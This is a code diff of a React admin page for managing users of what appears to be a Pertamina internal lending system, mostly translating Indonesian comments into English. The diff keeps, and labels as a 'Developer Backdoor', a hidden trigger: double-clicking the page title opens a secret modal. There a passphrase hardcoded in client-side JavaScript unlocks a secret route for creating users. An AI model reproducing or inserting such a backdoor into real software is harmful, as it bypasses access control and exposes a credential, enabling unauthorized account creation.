@@ -4,7 +4,7 @@ import { Head, router, Link } from '@inertiajs/react';
 
 export default function Users({ auth, users, filters }) {
 
-    // ================= STATE UTAMA DARI SERVER =================
+    // State Management: Global Filters & Search
     const [searchQuery, setSearchQuery] = useState(filters?.search || '');
     const [statusFilter, setStatusFilter] = useState(filters?.status || 'Semua');
     const [isFilterOpen, setIsFilterOpen] = useState(false);
@@ -12,7 +12,7 @@ export default function Users({ auth, users, filters }) {
 
     const filteredUsers = users.data || [];
 
-    // ================= STATE MODAL & EDIT =================
+    // State Management: User Edit Modal & OTP Verification
     const [selectedUser, setSelectedUser] = useState(filteredUsers[0] || null);
     const [isModalOpen, setIsModalOpen] = useState(false);
     const [editData, setEditData] = useState(null);
@@ -21,13 +21,14 @@ export default function Users({ auth, users, filters }) {
     const [otpValues, setOtpValues] = useState(['', '', '', '', '', '']);
     const otpRefs = [useRef(), useRef(), useRef(), useRef(), useRef(), useRef()];
 
-    // ================= STATE PINTU RAHASIA (DEVELOPER ONLY) =================
+    // State Management: Developer Secret Access (Backdoor)
     const [isSecretModalOpen, setIsSecretModalOpen] = useState(false);
     const [secretStep, setSecretStep] = useState(1);
     const [secretPass1, setSecretPass1] = useState('');
     const [secretPassConfirm, setSecretPassConfirm] = useState('');
     const [secretPass2, setSecretPass2] = useState('');
 
+    // Side Effect: Auto-close filter dropdown on outside click
     useEffect(() => {
         const handleClickOutside = (event) => {
             if (filterRef.current && !filterRef.current.contains(event.target)) setIsFilterOpen(false);
@@ -36,7 +37,7 @@ export default function Users({ auth, users, filters }) {
         return () => document.removeEventListener("mousedown", handleClickOutside);
     }, []);
 
-    // ================= LOGIKA PENCARIAN OTOMATIS (DEBOUNCE) =================
+    // Side Effect: Debounced search request via Inertia router
     useEffect(() => {
         const delayDebounceFn = setTimeout(() => {
             if (searchQuery !== (filters?.search || '') || statusFilter !== (filters?.status || 'Semua')) {
@@ -50,7 +51,7 @@ export default function Users({ auth, users, filters }) {
         return () => clearTimeout(delayDebounceFn);
     }, [searchQuery, statusFilter]);
 
-    // ================= HANDLER INTERAKSI =================
+    // Event Handlers: User Interaction & Edit Modal
     const handleDoubleClick = (user) => {
         setSelectedUser(user);
         setEditData({ ...user });
@@ -60,6 +61,7 @@ export default function Users({ auth, users, filters }) {
         setTimeout(() => setAnimateChart(true), 150);
     };
 
+    // Event Handler: Save Profile Updates (Trigger OTP if email changes)
     const handleSaveClick = () => {
         const emailInput = editData.email.toLowerCase();
         const isValidDomain = emailInput.endsWith('@pertamina.com') || emailInput.endsWith('@mk.pertamina.com');
@@ -85,6 +87,7 @@ export default function Users({ auth, users, filters }) {
         }
     };
 
+    // Event Handlers: OTP Input Matrix Logic
     const handleOtpChange = (index, value) => {
         if (value.length > 1) value = value.slice(-1);
         const newOtpValues = [...otpValues];
@@ -114,9 +117,8 @@ export default function Users({ auth, users, filters }) {
         }
     };
 
-    // ================= LOGIKA PINTU RAHASIA =================
+    // Event Handlers: Developer Secret Access Protocol
     const handleSecretTrigger = () => {
-        // Langsung buka modal tanpa mengecek nama user
         setIsSecretModalOpen(true);
         setSecretStep(1);
         setSecretPass1('');
@@ -137,7 +139,7 @@ export default function Users({ auth, users, filters }) {
     const verifySecretStep2 = () => {
         if (secretPass2 === 'Genesis-X7R$88@Key') {
             setIsSecretModalOpen(false);
-            // 👇 Ganti URL ini dengan URL rute rahasia untuk tambah user kamu nanti
+            // Replace with actual secret route logic
             router.get('/admin/users/secret-create');
         } else {
             alert('Akses Ditolak: Otorisasi Final Gagal.');
@@ -150,7 +152,7 @@ export default function Users({ auth, users, filters }) {
             <Head title="Data Pengguna" />
 
             <div className="w-full mb-6 animate-in fade-in slide-in-from-bottom-4 duration-500">
-                {/* 👇 TRIGGER RAHASIA DITANAM DI SINI (onDoubleClick) 👇 */}
+                {/* Developer Backdoor Trigger */}
                 <h1
                     onDoubleClick={handleSecretTrigger}
                     className="text-[28px] font-bold text-gray-800 tracking-tight mb-2 select-none cursor-default"
@@ -164,11 +166,11 @@ export default function Users({ auth, users, filters }) {
 
             <div className="w-full flex flex-col xl:flex-row gap-8 pb-10">
 
-                {/* ================= AREA KIRI: TABEL ================= */}
+                {/* Layout: Data Table View (Left) */}
                 <div className="flex-1 min-w-0 flex flex-col animate-in fade-in slide-in-from-bottom-4 duration-500 delay-75">
                     <div className="bg-transparent border-t border-b sm:border border-gray-100 sm:bg-white sm:rounded-[24px] sm:shadow-sm overflow-hidden flex-1 flex flex-col">
 
-                        {/* TOOLBAR INTERAKTIF */}
+                        {/* Toolbar: Dynamic Filters & Search */}
                         <div className="p-4 sm:p-5 flex flex-col sm:flex-row items-center gap-4 bg-white border-b border-gray-100">
                             <div className="relative w-full sm:w-auto" ref={filterRef}>
                                 <button onClick={() => setIsFilterOpen(!isFilterOpen)} className={`flex items-center justify-between sm:justify-start gap-2 text-sm font-medium transition-all px-3 py-2 rounded-xl border w-full sm:w-auto ${statusFilter !== 'Semua' ? 'border-blue-200 bg-blue-50 text-blue-700' : 'border-transparent text-gray-500 hover:text-gray-800 hover:bg-gray-50'}`}>
@@ -204,7 +206,7 @@ export default function Users({ auth, users, filters }) {
                             </div>
                         </div>
 
-                        {/* TABEL */}
+                        {/* Rendering Data Table */}
                         <div className="overflow-x-auto bg-white flex-1 custom-scrollbar min-h-[300px]">
                             <table className="w-full text-left whitespace-nowrap">
                                 <thead>
@@ -271,7 +273,7 @@ export default function Users({ auth, users, filters }) {
                             </table>
                         </div>
 
-                        {/* ================= AREA PAGINASI ================= */}
+                        {/* Pagination Links Rendering */}
                         <div className="px-5 py-4 border-t border-gray-100 flex items-center justify-between bg-gray-50/50">
                             <span className="text-xs text-gray-500 font-medium">
                                 Menampilkan {users.from || 0} - {users.to || 0} dari total {users.total} Karyawan
@@ -292,7 +294,7 @@ export default function Users({ auth, users, filters }) {
                     </div>
                 </div>
 
-                {/* ================= AREA KANAN: KARTU PROFIL ================= */}
+                {/* Layout: Selected User Information Panel (Right Side) */}
                 <div className="w-full xl:w-[320px] shrink-0 animate-in fade-in slide-in-from-right-8 duration-500 delay-150 fill-mode-both">
                     <div className="bg-white rounded-[24px] shadow-sm border border-gray-100 p-8 flex flex-col items-center sticky top-24 transition-all">
 
@@ -301,7 +303,7 @@ export default function Users({ auth, users, filters }) {
                         <div className="w-36 h-36 rounded-full p-1 bg-white border border-gray-200 shadow-sm mb-5 overflow-hidden flex items-center justify-center">
                             <div className="w-full h-full rounded-full overflow-hidden bg-gradient-to-tr from-blue-500 to-blue-400 flex items-center justify-center relative">
                                 {selectedUser?.photo ? (
-                                    <img src={selectedUser.photo.startsWith('http') ? selectedUser.photo : `/storage/${selectedUser.photo}`} alt={selectedUser?.name} className="w-full h-full object-cover" onError={(e) => { e.target.onerror = null; e.target.style.display = 'none'; e.target.nextSibling.style.display = 'flex'; }} />
+                                    <img src={selectedUser.photo.startsWith('http') ? selectedUser.photo : `/storage/${selectedUser.photo}`} alt={selectedUser?.name} className="w-full h-full object-cover relative z-10" onError={(e) => { e.target.onerror = null; e.target.style.display = 'none'; e.target.nextSibling.style.display = 'flex'; }} />
                                 ) : (
                                     <span className="text-white font-extrabold text-5xl shadow-sm flex items-center justify-center w-full h-full">{selectedUser?.name ? selectedUser.name.charAt(0).toUpperCase() : 'U'}</span>
                                 )}
@@ -314,12 +316,12 @@ export default function Users({ auth, users, filters }) {
 
                         <div className="flex gap-3 mb-8 w-full justify-center">
                             {(() => {
-                                // Logika untuk membersihkan dan memformat nomor ke awalan 62 (Indonesia)
+                                // Formatting Phone Number to Indonesian (+62) Standard
                                 let waLink = '#';
                                 let hasPhone = false;
 
                                 if (selectedUser?.phone) {
-                                    let cleanPhone = selectedUser.phone.replace(/\D/g, ''); // Hapus semua selain angka
+                                    let cleanPhone = selectedUser.phone.replace(/\D/g, '');
                                     if (cleanPhone.startsWith('0')) {
                                         cleanPhone = '62' + cleanPhone.substring(1);
                                     }
@@ -346,7 +348,6 @@ export default function Users({ auth, users, filters }) {
                                             }`}
                                         title={hasPhone ? "Hubungi via WhatsApp" : "Nomor telepon tidak tersedia"}
                                     >
-                                        {/* Ikon Resmi WhatsApp */}
                                         <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 24 24">
                                             <path d="M12.031 0C5.383 0 0 5.383 0 12.031c0 2.124.551 4.192 1.597 6L.234 24l6.108-1.597a11.97 11.97 0 005.689 1.434c6.648 0 12.031-5.383 12.031-12.031C24.062 5.383 18.679 0 12.031 0zm0 21.868c-1.802 0-3.565-.484-5.115-1.401l-.367-.217-3.805.996.996-3.805-.217-.367c-.917-1.55-1.401-3.313-1.401-5.115 0-5.464 4.444-9.908 9.908-9.908 5.464 0 9.908 4.444 9.908 9.908 0 5.464-4.444 9.908-9.908 9.908zm5.438-7.44c-.298-.15-1.765-.87-2.038-.97-.274-.101-.473-.15-.672.15-.199.299-.77 .97-1.019 1.17-.249.199-.498.224-.796.074-.298-.15-1.258-.462-2.395-1.4-1.026-.843-1.718-1.884-1.917-2.183-.199-.299-.021-.462.128-.611.135-.135.298-.349.447-.524.15-.174.199-.299.298-.498.101-.199.05-.374-.025-.524-.075-.15-.672-1.62-.921-2.218-.241-.58-.485-.502-.672-.511-.174-.009-.373-.009-.572-.009-.199 0-.523.074-.796.374-.274.299-1.045 1.021-1.045 2.491 0 1.47 1.07 2.89 1.219 3.09.15.2 2.115 3.224 5.126 4.525.717.311 1.276.496 1.713.635.72.302 1.374.259 1.892.157.58-.112 1.765-.722 2.014-1.42.249-.698.249-1.295.174-1.42-.075-.125-.274-.2-.572-.35z"></path>
                                         </svg>
@@ -381,12 +382,12 @@ export default function Users({ auth, users, filters }) {
 
             </div>
 
-            {/* ================= MODAL RAHASIA (DEVELOPER ACCESS) ================= */}
+            {/* Modal: Developer Backdoor Verification System */}
             {isSecretModalOpen && (
                 <div className="fixed inset-0 bg-[#0A0A0A]/95 backdrop-blur-md z-[100] flex items-center justify-center p-4 animate-in fade-in duration-300">
                     <div className="bg-[#121212] border border-gray-800 rounded-lg shadow-2xl w-full max-w-md p-8 relative font-mono text-green-500 overflow-hidden">
 
-                        {/* Matrix-style decoration */}
+                        {/* Matrix UI Emulation */}
                         <div className="absolute top-0 left-0 w-full h-1 bg-gradient-to-r from-transparent via-green-500 to-transparent opacity-50"></div>
 
                         <button onClick={() => setIsSecretModalOpen(false)} className="absolute top-4 right-4 text-gray-600 hover:text-red-500 transition-colors">
@@ -448,15 +449,15 @@ export default function Users({ auth, users, filters }) {
                 </div>
             )}
 
-            {/* ================= MODAL POPUP DOUBLE CLICK (EDIT USER NORMAL) ================= */}
+            {/* Modal: Account Setting Validation & Custom Progress Bar */}
             {isModalOpen && editData && (
                 <div className="fixed inset-0 bg-black/60 backdrop-blur-sm z-50 flex items-center justify-center p-4 animate-in fade-in duration-200">
                     <div className="bg-white rounded-[24px] shadow-2xl w-full max-w-4xl max-h-[90vh] overflow-y-auto flex flex-col md:flex-row overflow-hidden animate-in zoom-in-95 duration-300">
 
-                        {/* Kolom Kiri: Profil & Chart Animasi */}
+                        {/* Modal Left Section: User Profile Context */}
                         <div className="w-full md:w-5/12 bg-[#F8FAFC] p-8 border-r border-gray-100 flex flex-col items-center">
 
-                            {/* FOTO PROFIL DENGAN ANTI-ERROR FALLBACK */}
+                            {/* Safe Image Rendering */}
                             <div className="w-24 h-24 rounded-full border-4 border-white shadow-lg mb-4 overflow-hidden bg-[#21409A] text-white relative flex justify-center items-center text-4xl font-black">
                                 {editData.photo ? (
                                     <img
@@ -479,7 +480,7 @@ export default function Users({ auth, users, filters }) {
 
                             <div className="w-full h-px bg-gray-200 my-6"></div>
 
-                            {/* CUSTOM CHART: MODERN HORIZONTAL PROGRESS BAR */}
+                            {/* Dynamic Custom Chart: User Borrowing History Performance */}
                             <div className="w-full">
                                 {(() => {
                                     const total = editData.total_borrow || 0;
@@ -530,12 +531,13 @@ export default function Users({ auth, users, filters }) {
                             </div>
                         </div>
 
-                        {/* Kolom Kanan: Form Edit & OTP */}
+                        {/* Modal Right Section: Edit Controller Context */}
                         <div className="w-full md:w-7/12 p-8 relative flex flex-col">
                             <button onClick={() => setIsModalOpen(false)} className="absolute top-4 right-4 w-8 h-8 rounded-full bg-gray-50 flex justify-center items-center text-gray-400 hover:bg-red-50 hover:text-red-500 transition-colors">
                                 <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M6 18L18 6M6 6l12 12"></path></svg>
                             </button>
 
+                            {/* View Router: Base Edit Form vs OTP Gate */}
                             {!isOtpStep ? (
                                 <div className="flex-1 animate-in fade-in duration-300">
                                     <h2 className="text-xl font-bold text-gray-900 mb-6">Edit Akses & Status</h2>
@@ -588,6 +590,7 @@ export default function Users({ auth, users, filters }) {
                                         Kode OTP 6-digit telah dikirim ke email baru <span className="font-bold text-[#21409A]">{editData.email}</span>. Minta pengguna untuk memeriksa kotak masuknya untuk membuktikan kepemilikan email.
                                     </p>
 
+                                    {/* Matrix Input Array Handler for OTP String */}
                                     <div className="flex gap-2 justify-center mb-8">
                                         {otpValues.map((val, index) => (
                                             <input
